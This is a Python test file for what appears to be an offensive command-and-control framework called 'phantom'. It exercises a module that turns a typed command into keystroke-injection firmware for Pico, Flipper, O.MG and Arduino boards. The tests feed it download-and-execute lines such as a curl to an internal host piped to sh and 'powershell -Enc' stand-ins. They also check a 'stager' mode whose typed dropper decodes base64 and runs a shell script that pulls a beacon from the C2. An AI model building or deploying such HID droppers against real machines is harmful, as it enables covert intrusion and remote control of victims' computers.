"""9.1/9.2 — the USB HID vector: a board that TYPES the payload.

AutoRun on removable volumes is disabled at the OS level, so a mass-storage
stick is not a vector; a keyboard-injector board is. These tests pin the
artefact per board (CircuitPython for the Pico, DuckyScript for Flipper and
O.MG), the fact that the typed command is the OPERATOR's choice with its
mismatches stated, and that nothing here guesses the target OS — it cannot,
the board types into whatever machine it is plugged into.
"""
import os

import pytest

from phantom.utils.hid_builder import (
    ARDUINO_BOARDS,
    BOARDS,
    DUCKYSCRIPT_BOARDS,
    board_notes,
    build_hid_payload,
)


class TestBoards:
    @pytest.mark.parametrize("board", BOARDS)
    def test_every_board_produces_an_artefact(self, board):
        payload = build_hid_payload(board, "whoami")
        assert payload.content
        assert payload.board == board
        assert payload.filename

    @pytest.mark.parametrize("board", DUCKYSCRIPT_BOARDS)
    def test_the_keystroke_boards_get_duckyscript(self, board):
        payload = build_hid_payload(board, "whoami", delay_ms=1000)
        assert payload.filename.endswith(".txt")
        assert "DELAY 1000" in payload.content
        assert "STRING whoami" in payload.content
        assert payload.content.rstrip().endswith("ENTER")

    def test_the_pico_gets_circuitpython(self):
        payload = build_hid_payload("pico", "whoami", delay_ms=2000)
        assert payload.filename == "main.py"
        assert "import usb_hid" in payload.content
        assert "adafruit_hid.keyboard_layout_us" in payload.content
        assert "time.sleep(2.00)" in payload.content
        assert "layout.write('whoami')" in payload.content
        assert "Keycode.ENTER" in payload.content

    def test_an_unknown_board_is_refused(self):
        with pytest.raises(ValueError) as excinfo:
            build_hid_payload("teensy", "whoami")
        assert "teensy" in str(excinfo.value)

    def test_an_empty_command_is_refused(self):
        with pytest.raises(ValueError):
            build_hid_payload("pico", "   ")

    def test_board_case_does_not_matter(self):
        assert build_hid_payload("PICO", "x").board == "pico"


class TestTheTypedCommand:
    def test_the_command_is_typed_verbatim(self):
        cmd = "curl -sk 'https://10.0.0.5:8443/api/v1/payload_linux?auth=T' | sh"
        payload = build_hid_payload("flipper", cmd)
        assert f"STRING {cmd}" in payload.content

    def test_enter_is_optional(self):
        assert "ENTER" not in build_hid_payload("omg", "x",
                                                press_enter=False).content

    def test_grouping_quotes_are_not_typed(self):
        # `payload hid pico "powershell -Enc X"`: the quotes group the
        # argument for the shell, they are not part of the instruction
        payload = build_hid_payload("pico", '"powershell -Enc X"')
        assert "layout.write('powershell -Enc X')" in payload.content

    def test_quotes_inside_the_command_survive(self):
        payload = build_hid_payload("pico", 'echo "a b"')
        assert 'layout.write(\'echo "a b"\')' in payload.content

    def test_the_board_cannot_detect_the_target_and_says_so(self):
        notes = build_hid_payload("pico", "whoami").notes
        assert any("must match the TARGET os" in n for n in notes), notes

    def test_a_windows_run_dialog_on_a_linux_target_is_flagged(self):
        notes = build_hid_payload("flipper", "whoami", target="linux",
                                  open_run=True).notes
        assert any("WINDOWS keystroke" in n for n in notes), notes

    def test_a_windows_command_on_a_linux_target_is_flagged(self):
        notes = build_hid_payload(
            "flipper", "powershell -Enc AAAA", target="linux").notes
        assert any("looks Windows" in n for n in notes), notes

    def test_a_posix_command_on_a_windows_target_is_flagged(self):
        notes = build_hid_payload("pico", "curl -sk http://h/x | sh",
                                  target="windows").notes
        assert any("looks POSIX" in n for n in notes), notes

    def test_a_matching_command_needs_no_warning(self):
        notes = build_hid_payload("pico", "whoami", target="linux").notes
        assert not any("looks" in n for n in notes), notes

    def test_a_long_command_is_flagged_as_visible_and_slow(self):
        notes = build_hid_payload("arduino", "x" * 5000).notes
        assert any("very long command" in n for n in notes), notes

    def test_the_short_stager_command_needs_no_length_warning(self):
        notes = build_hid_payload("flipper", "whoami").notes
        assert not any("very long command" in n for n in notes), notes


class TestTheArduinoBoard:
    """A scant-flash Arduino-IDE board: the beacon is NOT on the board, so
    tens of KB of flash is enough to hold the firmware and the typed
    command — the stager downloads the beacon from the C2."""

    @pytest.mark.parametrize("board", ARDUINO_BOARDS)
    def test_it_gets_a_keyboard_sketch(self, board):
        payload = build_hid_payload(board, "whoami", delay_ms=2000)
        assert payload.filename == "phantom_hid.ino"
        assert "#include <Keyboard.h>" in payload.content
        assert "delay(2000)" in payload.content
        assert 'Keyboard.print(F("whoami"));' in payload.content
        assert "KEY_RETURN" in payload.content

    def test_the_command_is_kept_in_flash_not_ram(self):
        notes = build_hid_payload("arduino", "whoami").notes
        assert any("must match the TARGET os" in n for n in notes), notes
        flash_notes = board_notes("arduino")
        assert any("F()" in n and "flash" in n for n in flash_notes)
        assert any("beacon" in n for n in flash_notes)

    def test_a_multi_kilobyte_command_still_builds(self):
        payload = build_hid_payload("arduino", "A" * 11000, target="windows")
        assert payload.content.count("A") >= 11000

    def test_quotes_and_backslashes_in_the_command_are_escaped(self):
        payload = build_hid_payload("arduino", 'echo "a b" \\x')
        assert 'Keyboard.print(F("echo \\"a b\\" \\\\x"));' in payload.content

    def test_enter_is_optional(self):
        assert "KEY_RETURN" not in build_hid_payload(
            "arduino", "x", press_enter=False).content

    def test_the_run_dialog_is_typed_before_the_command(self):
        payload = build_hid_payload("flipper", "whoami", target="windows",
                                    open_run=True)
        body = payload.content
        assert body.index("HOLD GUI R") < body.index("STRING whoami")
        pico = build_hid_payload("pico", "whoami", target="windows",
                                 open_run=True).content
        assert pico.index("kbd.press(Keycode.GUI, Keycode.R)") < \
            pico.index("layout.write")


class TestFlashingNotes:
    @pytest.mark.parametrize("board", BOARDS)
    def test_every_board_explains_how_it_is_flashed(self, board):
        notes = board_notes(board)
        assert notes and any(len(n) > 20 for n in notes)

    def test_an_unknown_board_has_no_notes(self):
        assert board_notes("teensy") == ()


class TestHidCommand:
    def _run(self, arg, tmp_path):
        from unittest import mock
        from phantom.modules.payload import PayloadModule
        module = PayloadModule()
        out = os.path.join(str(tmp_path), "artefact")
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            module.do_hid(f"{arg} --out {out}")
        with open(out, encoding="utf-8") as handle:
            return handle.read(), notifier

    def test_it_writes_the_artefact_the_operator_asked_for(self, tmp_path):
        content, _ = self._run("pico 'whoami' --target linux", tmp_path)
        assert "usb_hid" in content and "layout.write('whoami')" in content

    def test_the_stager_flag_builds_the_real_dropper(self, tmp_path):
        content, notifier = self._run(
            "flipper --stager linux --target linux", tmp_path)
        assert "STRING echo " in content
        # the resilient POSIX stager is what gets typed, and it carries the
        # C2 endpoint inside its own retry script (option C, 8.1)
        assert "base64 -d | sh" in content

    def test_the_arduino_stager_is_resilient_and_fits_the_board(self,
                                                                tmp_path):
        content, _ = self._run(
            "arduino --stager linux --target linux", tmp_path)
        # the short resilient POSIX stager, typed by the board: it retries on
        # its own if the C2 is down when the board is plugged in
        assert "base64 -d | sh" in content
        assert '#include <Keyboard.h>' in content

    def test_a_stager_target_mismatch_is_refused_before_writing(self,
                                                                tmp_path):
        from phantom.modules.payload import PayloadModule
        module = PayloadModule()
        out = os.path.join(str(tmp_path), "nope")
        from unittest import mock
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            module.do_hid(f"flipper --stager linux --target windows "
                          f"--out {out}")
        assert not os.path.exists(out)
        assert any("PE ≠ ELF" in str(c) or "pick one" in str(c)
                   for c in notifier.error.call_args_list)

    def test_a_missing_board_is_refused(self, tmp_path):
        from phantom.modules.payload import PayloadModule
        from unittest import mock
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            PayloadModule().do_hid("--stager linux")
        assert notifier.error.called

    def test_the_command_is_listed_in_the_module_help(self):
        from phantom.modules.payload import PayloadModule
        commands = PayloadModule().build_commands()
        assert any("hid" in c for c in commands["DELIVERY"])
